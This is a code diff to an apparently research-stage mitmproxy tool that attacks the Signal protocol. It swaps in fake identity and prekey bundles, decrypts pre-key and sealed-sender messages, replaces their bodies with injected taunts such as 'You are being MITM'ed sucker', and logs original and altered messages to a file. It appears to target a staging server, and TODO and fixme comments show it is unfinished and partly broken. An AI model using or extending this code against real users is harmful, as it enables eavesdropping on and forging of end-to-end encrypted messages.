@@ -11,6 +11,8 @@ import logging
 # FORMAT = "[%(filename)s:%(lineno)s-%(funcName)20s()] %(message)s"
 # logging.basicConfig(format=FORMAT)
 # logging.getLogger('mitmproxy').
+import time
+import config
 
 from xepor import InterceptedAPI, RouteType, HTTPVerb, Router
 import json
@@ -28,8 +30,10 @@ from database import User, Device, LegitBundle, MitMBundle
 from enum import Enum
 import parse
 
-from protos.gen.SignalService_pb2 import Envelope
+from protos.gen.SignalService_pb2 import Content, Envelope, DataMessage
 from protos.gen.WebSocketResources_pb2 import WebSocketMessage, WebSocketRequestMessage, WebSocketResponseMessage
+from signal_protocol.protocol import CiphertextMessage
+
 from server_proto import addons, HOST_HTTPBIN
 from mitm_interface import MitmUser
 from collections import defaultdict
@@ -43,6 +47,15 @@ from collections import defaultdict
 # logging.getLogger('xepor.xepor').setLevel(logging.INFO)
 # logging.getLogger('mitmproxy.proxy.server').setLevel(logging.WARN)  # too noisy
 
+def dataMessageFlags(flags_value: int):
+    from protos.gen.SignalService_pb2 import DataMessage
+    # Check which flags are set in the flags_value
+    flags_set = {
+        'END_SESSION': bool(flags_value & DataMessage.END_SESSION),
+        'EXPIRATION_TIMER_UPDATE': bool(flags_value & DataMessage.EXPIRATION_TIMER_UPDATE),
+        'PROFILE_KEY_UPDATE': bool(flags_value & DataMessage.PROFILE_KEY_UPDATE),
+    }
+    return flags_set
 
 class CiphertextMessageType(Enum):
     WHISPER = 2
@@ -50,6 +63,10 @@ class CiphertextMessageType(Enum):
     SENDER_KEY_DISTRIBUTION = 7
     PLAINTEXT = 8
 
+class ContentHint(Enum):
+    DEFAULT = 0  # This message has content, but you shouldn't expect it to be re-sent to you
+    RESENDABLE = 1 # You should expect to be able to have this content be re-sent to you
+    IMPLICIT = 2 # This message has no real content and likely cannot be re-sent to you
 
 class EnvelopeType(Enum):
     # https://github.com/signalapp/Signal-Android/blob/main/libsignal-service/src/main/protowire/SignalService.proto#L14-L23
@@ -108,7 +125,7 @@ class RegistrationInfo:
 
 
 @dataclass
-class BobIdenKey():
+class BobIdenKey:
     uuid: str
     identityKey: Optional[IdentityKeyPair] = None
     fake_identityKey: Optional[IdentityKeyPair] = None
@@ -506,7 +523,8 @@ def v2_keys_identifier_device_id(flow: HTTPFlow, identifier: str, device_id: str
         )
         alice_reg_id = registration_info[ip_address].registrationId
         # todo: fucked has the wrong spk (id at least so probably fucked somewehre else too)
-        fakeVictim = MitmUser(ProtocolAddress(registration_info[ip_address].aci, bundle["deviceId"]), RID=alice_reg_id,
+        fakeVictim = MitmUser(ProtocolAddress(registration_info[ip_address].aci, bundle["deviceId"]),
+                              RID=alice_reg_id,
                               identity_key=fake_ikp)
 
         bob_registration_id = bundle["registrationId"]
@@ -685,6 +703,61 @@ def v2_keys_identifier_device_id(flow: HTTPFlow, identifier: str, device_id: str
     flow.response.content = resp_content
 
 
+    alice_uuid = registration_info.get(ip_address).aci
+    aci_bundle: MitMBundle = MitMBundle.get(aci=alice_uuid, type="aci", deviceId=1)
+    pni_bundle: MitMBundle = MitMBundle.get(aci=alice_uuid, type="pni", deviceId=1)
+
+    from signal_protocol.state import SignedPreKeyRecord, SignedPreKeyId, PreKeyId, PreKeyRecord, KyberPreKeyId
+    from signal_protocol.curve import KeyPair
+    from signal_protocol.kem import KeyPair as KemKeyPair
+
+    def __bundle_to_victim(fakeVictim, bundle: MitMBundle):
+        spk = bundle.FakeSignedPreKey
+        pre_keys = bundle.FakePrekeys
+        kyber_keys = bundle.fakeKyberKeys
+        # last_kyber = bundle.fakeLastResortKyber # todo: No sigs?
+
+        spk_id = SignedPreKeyId(spk["keyId"])
+        spk_record = SignedPreKeyRecord(
+            spk_id,
+            int(time.time()),
+            KeyPair.from_public_and_private(
+                base64.b64decode(spk["publicKey"]),
+                base64.b64decode(spk["privateKey"])
+            ),
+            base64.b64decode(spk["signature"]),
+        )
+        fakeVictim.store.save_signed_pre_key(spk_id,spk_record)
+
+        for k in pre_keys:
+            pre_key_id = PreKeyId(k["keyId"])
+            key_pair = KeyPair.from_public_and_private(
+                base64.b64decode(k["publicKey"]),
+                base64.b64decode(k["privateKey"])
+            )
+            pre_key_record = PreKeyRecord(
+                pre_key_id, key_pair
+            )
+            fakeVictim.store.save_pre_key(pre_key_id, pre_key_record)
+
+        for k in kyber_keys:
+            kyber_id = k["keyId"]
+            key_pair = KemKeyPair.from_public_and_private(
+                base64.b64decode(k["publicKey"]),
+                base64.b64decode(k["privateKey"])
+            )
+            kyber_record = utils.make_kyber_record(
+                kyber_id,
+                int(time.time()),
+                key_pair,
+                base64.b64decode(k["signature"]),
+            )
+            fakeVictim.store.save_kyber_pre_key(KyberPreKeyId(kyber_id), kyber_record)
+        # todo: lastResortKyber does not have a signature
+
+    __bundle_to_victim(fakeVictim, aci_bundle)
+    __bundle_to_victim(fakeVictim, pni_bundle)
+
 def _v1_ws_my_profile(flow, identifier, version, credentialRequest):
     logging.info(f"my profile: {identifier} {version} {credentialRequest}")
 
@@ -810,10 +883,10 @@ def _v1_ws_message(flow, identifier):
         msg_type = EnvelopeType(int(msg["type"]))
 
         from protos.gen.SignalService_pb2 import Content
-        from signal_protocol.protocol import CiphertextMessage
 
         if msg_type == EnvelopeType.PRE_KEY_BUNDLE:
             try:
+                # fixme: fakeUser should start a session with the ProtocolAddress of the VICTIM, NOT THE DESTINATION
                 dec: Content = fakeUser.decrypt(ProtocolAddress(destination, msg["destinationDeviceId"]), content)
                 logging.warning(f"DECRYPTION IS:\n{dec}")
             except Exception as e:
@@ -825,17 +898,21 @@ def _v1_ws_message(flow, identifier):
                 if dec.typingMessage.timestamp == 0:
                     # not a timestamp message
                     out_msg = f"bist du ein 🐿️? -- От судьбы не уйти.!\n[orig msg was: {dec.dataMessage.body}]\nPowered by SCION\n(https://www.youtube.com/watch?v=CzXJ0i4xABI)".encode()
+                    # if b"pizza" in dec.dataMessage.body:
+                    out_msg = f"Do you want to do crimes ^^ ? 🔪🥷🏿 ".encode()
                     to_enc = Content()
                     to_enc.CopyFrom(dec)
                     to_enc.dataMessage.body = out_msg
+
+                    with open("conversation.txt", "w+") as f:
+                        f.write(f"<ORIGINAL_OUTGOING_MESSAGE>{dec.dataMessage.body}</ORIGINAL_OUTGOING_MESSAGE>")
+                        f.write(f"<OUTGOING_MESSAGE>{out_msg}</OUTGOING_MESSAGE>")
                 else:
                     to_enc = Content()
                     to_enc.CopyFrom(dec)
 
                 enc: CiphertextMessage = fakeVictim.encrypt(ProtocolAddress(destination_user, 1),
                                                             to_enc.SerializeToString())
-                # enc: CiphertextMessage = fakeUser.encrypt(ProtocolAddress(destination_user, 1),
-                #                                           to_enc.SerializeToString())
                 logging.info(f"Created CTXT: {enc}")
                 logging.warning(f"NEW ENCRYPTION (type - {enc.message_type()}): {enc}")
                 msg["content"] = b64encode(enc.serialize()).decode()
@@ -852,6 +929,7 @@ def decap_ws_msg(orig_flow: HTTPFlow, ws_msg, rtype=RouteType.REQUEST):
     f = HTTPFlow(client_conn=orig_flow.client_conn, server_conn=orig_flow.server_conn)
 
     if rtype == RouteType.REQUEST:
+        ws_msg: WebSocketRequestMessage
         # todo: handle headers
         f.request = Request(host=orig_flow.request.host, port=orig_flow.request.port,
                             scheme=orig_flow.request.scheme.encode(),
@@ -862,8 +940,9 @@ def decap_ws_msg(orig_flow: HTTPFlow, ws_msg, rtype=RouteType.REQUEST):
                             timestamp_end=orig_flow.request.timestamp_end,
                             path=ws_msg.path.encode(), headers=Headers(), content=ws_msg.body)
     else:
+        ws_msg: WebSocketResponseMessage
         # todo: handle headeers + reason
-        f.response = Response(http_version=orig_flow.response.http_version.encode(), status_code=ws_msg.status, reason=b"id: ",
+        f.response = Response(http_version=orig_flow.response.http_version.encode(), status_code=getattr(ws_msg, 'status', 200), reason=b"id: ",
                       headers=Headers(), content=ws_msg.body, trailers=None,
                       timestamp_start=orig_flow.response.timestamp_start,
                       timestamp_end=orig_flow.response.timestamp_end)
@@ -883,7 +962,7 @@ def v1_api_message(flow: HTTPFlow):
     envelope = Envelope()
     envelope.ParseFromString(flow.request.content)
 
-    if envelope.type == Envelope.RECEIPT:
+    if envelope.type == Envelope.RECEIPT and len(envelope.content) == 0:
         return flow.request.content
 
     ####### Another massive hack :/
@@ -892,33 +971,78 @@ def v1_api_message(flow: HTTPFlow):
     ############
 
     failed = False
+
+    from signal_protocol.state import SignedPreKeyRecord, SignedPreKeyId
+    fakeVictim.signed_pre_key_id = SignedPreKeyId(fakeUser.signed_pre_key_id.get_id())
+    # fakeVictim.signed_pre_key_pair = fakeUser.signed_pre_key_pair
+    # fakeVictim.signed_pre_key_signature = fakeUser.signed_pre_key_signature
+
+    fakeVictim.store.save_signed_pre_key(fakeVictim.signed_pre_key_id, SignedPreKeyRecord(
+        fakeVictim.signed_pre_key_id,
+        int(time.time()),
+        fakeVictim.signed_pre_key_pair,
+        fakeVictim.signed_pre_key_signature
+    ))
+
     try:
         result = sealed_sender_decrypt(envelope.content, TRUST_ROOT_STAGING_PK, int(time.time()), str(user.pNumber),
                                    str(device.aci), DeviceId(1), fakeVictim.store)
-        logging.warning("v SEALED SENDER DECRYPTION v")
-        logging.warning(result)
-        logging.warning(result.sender_e164())
-        logging.warning(result.sender_uuid())
-        logging.warning(result.device_id())
-        logging.warning(result.message())
-        logging.warning("^ SEALED SENDER DECRYPTION ^")
+        content = Content()
+        content.ParseFromString(utils.PushTransportDetails.get_stripped_padding_message_body(result.message()))
+        data, pni_signature = content.dataMessage, content.pniSignatureMessage
+        flags = dataMessageFlags(content.dataMessage.flags)
+
+        logging.warning(f"v SEALED SENDER DECRYPTION v"
+                        f"{result}"
+                        f"uuid: {result.sender_uuid()}"
+                        f"device_id: {result.device_id}"
+                        f"e164: {result.sender_e164()}"
+                        f"data: {data}"
+                        f"(flags): {flags}"
+                        f"pniSignature: {pni_signature}"
+                        "^ SEALED SENDER DECRYPTION ^")
+
+        ## TODO: verify the pni Message
+        ##
+        ##
+        to_enc = Content()
+        data_message = DataMessage()
+        data_message.body = f"You got 📩.\n[original '{data.body}']\nYou are being MITM'ed sucker 👀 ^^\n\nP.S Let's do CRIME! 🌈🌈".encode()
+        data_message.body = f"{data.body}.\nLet's hug some 🐈‍⬛🐈‍⬛🐈‍⬛ instead?".encode()
+
+        data_message.timestamp = data.timestamp
+        data_message.requiredProtocolVersion = data.requiredProtocolVersion
+        data_message.profileKey = b""
+        to_enc.dataMessage.CopyFrom(data_message)
+
+        ## todo: fakeVictim should have the address of real victim
+        enc: CiphertextMessage = fakeUser.encrypt(ProtocolAddress("79ed01b1-19e4-4b2f-b260-662630c39912", 1),
+                                                    to_enc.SerializeToString())
+        # todo: fix this when fakeUser is initialized properly
+
+        logging.info(f"Created CTXT: {enc}")
+        logging.warning(f"NEW ENCRYPTION (type - {enc.message_type()}): {enc}")
+        # data_message.body =
+        # to_enc.dataMessage =
+        # to_enc.dataMessage.
+
+        out_envelope = Envelope()
+        out_envelope.CopyFrom(envelope)
+        out_envelope.type = Envelope.CIPHERTEXT
+        out_envelope.content = enc.serialize()
+        out_envelope.sourceDevice = 1
+        out_envelope.sourceServiceId = f"PNI:79ed01b1-19e4-4b2f-b260-662630c39912"
+
+        with open("conversation.txt", "w+") as f:
+            f.write(f"<ORIGINAL_INCOMING_MESSAGE>{data.body}</ORIGINAL_INCOMING_MESSAGE>")
+            f.write(f"<INCOMING_MESSAGE>{data_message.body}</INCOMING_MESSAGE>")
+
+        # flow.request.content =
+        return out_envelope.SerializeToString()
+        # envelope.content =
+
     except Exception as e:
         logging.warning(f"DECRYPTION FAILED: no sealed sender :c if used fakeVictim (correct) \n\t{e}")
-        failed = True
-
-    if failed:
-        try:
-            result = sealed_sender_decrypt(envelope.content, TRUST_ROOT_STAGING_PK, int(time.time()), str(user.pNumber),
-                                           str(device.aci), DeviceId(1), fakeUser.store)
-            logging.warning("v SEALED SENDER DECRYPTION v")
-            logging.warning(result)
-            logging.warning(result.sender_e164())
-            logging.warning(result.sender_uuid())
-            logging.warning(result.device_id())
-            logging.warning(result.message())
-            logging.warning("^ SEALED SENDER DECRYPTION ^")
-        except Exception as exp:
-            logging.warning(f"DECRYPTION FAILED: no sealed sender :c if used fakeUser (should be bad) \n\t{exp}")
 
     return None
 
@@ -953,6 +1077,10 @@ def unwarp_websocket(ws: mitmproxy.websocket.WebSocketMessage) -> Union[
 
 @api.ws_route("/v1/websocket/", rtype=RouteType.REQUEST)
 def _v1_websocket_req(flow: HTTPFlow, msg):
+    if msg.injected:
+        logging.warning(f"Message already injected... skipping ^^ {msg}")
+        return
+
     ws_msg = unwarp_websocket(msg)
     logging.debug(f"WEBSOCKET (c2s): {ws_msg}")
     msg.injected = True
@@ -960,10 +1088,12 @@ def _v1_websocket_req(flow: HTTPFlow, msg):
     id = ws_msg.id
     if websocket_open_state.get(id):
         logging.warning(f"Message request already exists for id {id}")
-        # return
-    websocket_open_state[id] = PendingWebSocket()
-    websocket_open_state[ws_msg.id].request = ws_msg
-    path = websocket_open_state[id].request.path
+        # case when this is actually a response to a s2c request
+        path = websocket_open_state[ws_msg.id].request.path
+    else:
+        websocket_open_state[id] = PendingWebSocket()
+        websocket_open_state[ws_msg.id].request = ws_msg
+        path = ws_msg.path
 
     host = flow.request.pretty_host if flow.live else HOST_HTTPBIN
     if "signal" not in host:
@@ -990,6 +1120,9 @@ def _v1_websocket_req(flow: HTTPFlow, msg):
 
 @api.ws_route("/v1/websocket/", rtype=RouteType.RESPONSE)
 def _v1_websocket_resp(flow: HTTPFlow, msg):
+    if msg.injected:
+        logging.warning(f"Message already injected... skipping ^^ {msg}")
+        return
     ws_msg = unwarp_websocket(msg)
     logging.debug(f"WEBSOCKET (s2c): {ws_msg}")
     msg.injected = True
@@ -1010,9 +1143,9 @@ def _v1_websocket_resp(flow: HTTPFlow, msg):
     if "signal" not in host:
         host = HOST_HTTPBIN  # this shouldn't be needed but just to be safe ^^
 
-    ## TODO: this approach might be fundamentally road -- thinking of them as request/responses
+    ## TODO: this approach might be fundamentally wrong -- thinking of them as request/responses
     ## since for example /api/v1/message is a REQUEST sent by the server
-    ## A refactor to DICTION instead of RouteTzpe might make more sense...
+    ## A refactor to DIRECTION (c2s / s2c) instead of RouteType might make more sense...
     f = decap_ws_msg(flow, ws_msg, RouteType.RESPONSE) if "/api/v1/message" not in path \
         else decap_ws_msg(flow, ws_msg, RouteType.REQUEST) ## TODO: trust the websocket message info instead of direction flow
     handler, params, _ = ws_resp.find_handler(host, path)
@@ -1024,10 +1157,12 @@ def _v1_websocket_resp(flow: HTTPFlow, msg):
         msg.injected = True
         resp = handler(f, *params.fixed, **params.named)
         if resp:
-            # msg. = resp
             new_ws = WebSocketMessage()
             new_ws.ParseFromString(msg.content)
-            new_ws.response.body = resp
+            if new_ws.type == WebSocketMessage.RESPONSE:
+                new_ws.response.body = resp
+            elif new_ws.type == WebSocketMessage.REQUEST:
+                new_ws.request.body = resp
             msg.content = new_ws.SerializeToString()
 
 
@@ -1036,8 +1171,6 @@ addons = [api]
 from mitmproxy.tools.main import mitmdump
 
 if __name__ == "__main__":
-    import time
-    import config
 
     flow_name = f"debug_{int(time.time())}.flow"
     f = open(REGISTRATION_INFO_PATH, "wb")
